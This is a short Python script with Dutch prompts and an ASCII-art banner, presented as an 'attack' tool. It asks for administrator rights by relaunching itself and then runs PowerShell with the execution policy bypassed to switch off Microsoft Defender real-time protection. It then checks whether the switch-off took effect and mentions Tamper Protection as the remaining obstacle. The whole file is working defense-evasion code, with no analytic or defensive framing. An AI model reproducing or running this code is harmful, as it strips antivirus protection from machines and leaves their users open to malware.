import subprocess
import sys
import ctypes

def toon_banner():
    print("""
                  ⡟⠋⠉⠉⠛⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠻⢿⣿
                  ⣿⠀⠀⠀⠀⠀⠀⠉⠻⠿⣿⡿⣿⣿⣿⣿⣿⠿⠟⠋⠁⠀⠀⠀⢰⣿
                  ⣿⣦⠀⠀⠀⠦⢄⣤⠆⠀⠀⠀⠹⠟⠛⠀⠀⠰⠦⠖⠋⠀⠀⢰⣿⣿
                  ⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣶⣦⠀⠀⠀⠀⠀⠀⢠⣶⣾⣿⢿
                  ⣿⣿⣿⣿⣦⠀⠀⢀⣠⣤⣾⣿⣿⣿⣿⣿⣵⣶⣦⣤⣶⣾⣿⣿⡟⣼
                  ⣷⠀⠙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⢣⣿
                  ⣿⣧⠀⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⣠⣿⣿
                  ⣿⣿⣦⠘⣿⢿⣿⣿⣿⣯⣟⢿⣿⣿⣿⢿⣿⣿⣿⣿⠿⠇⣴⣿⣿⣿
                  ⣿⣿⣿⣷⡄⠘⠛⠛⣿⣿⣿⣿⣶⣿⣶⣿⣿⠟⠋⠀⠀⣸⣿⣿⣿⣿
                  ⣿⣿⣿⣿⣿⣦⣀⠀⠀⠀⠀⠀⠈⠉⠀⠀⠀⠀⣤⣶⣿⣿⣿⣿⣿⣿
                  ⣿⣿⣿⣿⣿⣿⣿⣿⣦⣤⣤⣀⣀⣀⣀⣀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿
                    Thijs Laurens Mario
    """)

def toon_help():
    print("\nOpties:")
    print("  /help    - Toon de opties")
    print("  /attack  - Start de attack")
    print("  /x       - exit")


def start_aanval():
    print("Aanval gestart...")

def afsluiten():
    print("Programma wordt afgesloten...")
    sys.exit()

uitschakel_cmd = [
    "powershell",
    "-ExecutionPolicy", "Bypass",
    "-NoProfile",
    "-Command",
    "Set-MpPreference -DisableRealtimeMonitoring $true"
]

controleer_status_cmd = [
    "powershell",
    "-ExecutionPolicy", "Bypass",
    "-NoProfile",
    "-Command",
    "Get-MpPreference | Select-Object -ExpandProperty DisableRealtimeMonitoring"
]

def is_admin():
    return ctypes.windll.shell32.IsUserAnAdmin() != 0

def start_opnieuw_als_admin():
    if not is_admin():
        print("Adminrechten worden aangevraagd...")
        ctypes.windll.shell32.ShellExecuteW(
            None, "runas", sys.executable, " ".join(sys.argv), None, 1
        )
        sys.exit()

def schakel_defender_uit():
    print("Microsoft Defender real-time bescherming uitschakelen...")
    try:
        subprocess.run(uitschakel_cmd, shell=True, check=True, capture_output=True, text=True)
        print("real-time bescherming zou nu uitgeschakeld moeten zijn.")
    except subprocess.CalledProcessError as e:
        print(f"Fout bij het uitschakelen van Defender: {e.stderr}")

def controleer_defender_status():
    print("Controleren of Defender real-time bescherming is uitgeschakeld...")
    try:
        result = subprocess.run(controleer_status_cmd, shell=True, capture_output=True, text=True)
        status = result.stdout.strip()
        if status == "True":
            print("Defender real-time bescherming is UITGESCHAKKELD.")
        else:
            print("Defender real-time bescherming is nog steeds INGESCHAKELD. Mogelijk moet u Tamper Protection uitschakelen.")
    except subprocess.CalledProcessError as e:
        print(f"Fout bij het controleren van de Defender-status: {e.stderr}")

def main():
    start_opnieuw_als_admin()
    toon_banner()

    while True:
        keuze = input("\nTyp '/help' voor hulp, '/attack' om een aanval te starten, of '/x' om af te sluiten: ").strip().lower()

        if keuze == '/help':
            toon_help()
        elif keuze == '/attack':
            start_aanval()
            break
        elif keuze == '/x':
            afsluiten()
        else:
            print("Ongeldige optie :(")

    schakel_defender_uit()
    controleer_defender_status()

    while True:
        afsluiten_keuze = input("\nDruk '/x' om het programma af te sluiten: ").strip().lower()
        if afsluiten_keuze == '/x':
            afsluiten()

if __name__ == "__main__":
    main()

